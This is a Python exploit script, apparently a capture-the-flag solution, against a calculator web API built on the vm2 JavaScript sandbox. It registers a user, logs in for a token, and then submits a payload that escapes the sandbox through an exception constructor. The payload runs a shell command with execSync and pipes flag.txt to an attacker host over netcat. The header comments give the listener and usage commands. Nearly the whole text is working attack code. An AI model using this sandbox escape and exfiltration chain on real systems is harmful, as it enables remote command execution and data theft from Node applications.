# nc -lnvp port
# python3 calculator.py target attacker port
# nc -lnvp 8000
# python3 calculator.py 127.0.0.1 192.168.206.139 8000
# https://github.com/patriksimek/vm2/commit/ff894fcbd43298614bd28bc173d3446961a86913

import requests
from json import loads
from sys import argv

def signup():
    payload = {
        'email': 'calc@local.host',
        'name': 'calc',
        'password': 'calculator'
    }
    response = requests.put(f'http://{argv[1]}/api/v1/signup', json = payload)
    if response.status_code == 201:
        print('[+] User created')
        return True
    print('[-] Something went wrong')
    return False

def login():
    payload = {
        'email': 'calc@local.host',
        'password': 'calculator'
    }
    response = requests.post(f'http://{argv[1]}/api/v1/login', json = payload)
    msg = response.json()
    if 'token' in msg:
        return {'Authorization': f'Bearer {msg["token"]}'}
    print('[-] Something went wrong')
    return None

def check(token):
    payload = {
        'calc': '(async () => { try { await import("oops!"); } catch (ex) { const process = ex.constructor.constructor("return process")(); const require = process.mainModule.require; const child_process = require("child_process"); const output = child_process.execSync("/bin/cat /proc/self/cwd/flag.txt | nc ' + argv[2] + ' ' + argv[3] + '"); process.stdout.write(output); } })();'
    }
    requests.post(f'http://{argv[1]}/api/v1/check', json = payload, headers = token)

if __name__ == '__main__':
    if signup():
        token = login()
        if token:
            check(token)
